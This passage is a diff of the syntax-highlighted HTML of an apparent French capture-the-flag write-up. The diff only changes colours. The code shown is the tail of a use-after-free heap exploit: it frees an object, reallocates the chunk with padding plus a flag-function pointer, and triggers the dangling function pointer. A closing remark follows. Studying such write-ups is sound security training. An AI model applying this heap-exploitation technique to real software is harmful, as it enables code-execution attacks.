-</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># free(robot)</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#6272a4"># free(robot)</span>
 </span></span><span style="display:flex;"><span>    supprimer()
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># manuel = malloc()</span>
-</span></span><span style="display:flex;"><span>    mode_emploi(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">16</span> <span style="color:#f92672">+</span> p64(flag))
+</span></span><span style="display:flex;"><span>    <span style="color:#6272a4"># manuel = malloc()</span>
+</span></span><span style="display:flex;"><span>    mode_emploi(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#39;A&#39;</span><span style="color:#ff79c6">*</span><span style="color:#bd93f9">16</span> <span style="color:#ff79c6">+</span> p64(flag))
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># robot-&gt;makeNoise</span>
-</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;Flag:&#34;</span>, parler()<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>)<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#39;utf-8&#39;</span>))
+</span></span><span style="display:flex;"><span>    <span style="color:#6272a4"># robot-&gt;makeNoise</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#34;Flag:&#34;</span>, parler()<span style="color:#ff79c6">.</span>replace(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;&#34;</span>)<span style="color:#ff79c6">.</span>decode(<span style="color:#f1fa8c">&#39;utf-8&#39;</span>))
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#75715e">#r.interactive()</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#6272a4">#r.interactive()</span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">if</span> __name__ <span style="color:#ff79c6">==</span> <span style="color:#f1fa8c">&#34;__main__&#34;</span>:
 </span></span><span style="display:flex;"><span>    main()
 </span></span></code></pre></div><h2 id="conclusion">Conclusion</h2>
 <p>Pour un premier challenge de <em>heap</em> de ma vie, j&rsquo;ai appris énormément de choses, c&rsquo;était super intéressant !</p>
